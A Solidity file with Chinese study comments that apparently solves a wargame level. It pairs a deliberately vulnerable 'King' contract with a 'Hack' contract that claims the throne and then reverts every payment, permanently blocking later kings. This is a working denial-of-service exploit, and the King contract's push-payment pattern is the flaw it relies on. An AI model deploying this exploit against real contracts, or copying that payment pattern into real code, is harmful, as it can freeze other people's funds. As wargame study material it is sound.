// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;//小声bb：这个Hack攻击后成为了新的国王
contract Hack{
    constructor(address payable target)payable{
        uint prize=King(target).prize();//这个地方会自动生成一个并得到prize的值
        (bool ok,)=target.call{value:prize}("");
        require(ok,"call failed");
    }
    //接下来要做的就是通过在fallback当中revert报错就行
    fallback() external payable {
        revert();
     }
}
contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {//容易被忘的点：构造函数的msg指的是最初被定义的时候的合约地址
    owner = msg.sender;  //容易搞错的点：构造函数只能运行一次。
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    //要求要么发送的钱比奖金（指的是发给上个国王的），要么就是合约的国王本人（起初是合约创始者）
   //所以如果想要阻止下一个国王的诞生，那就在成为国王之后写一个合约拒绝收到转账
   //使得trasfer失效
    payable(king).transfer(msg.value);//如果在上述判断中没出错，那就把钱给上个国王
    king = msg.sender;//重置国王
    prize = msg.value;//重置奖金
  }
  function _king() public view returns (address) {
    return king;
  }
}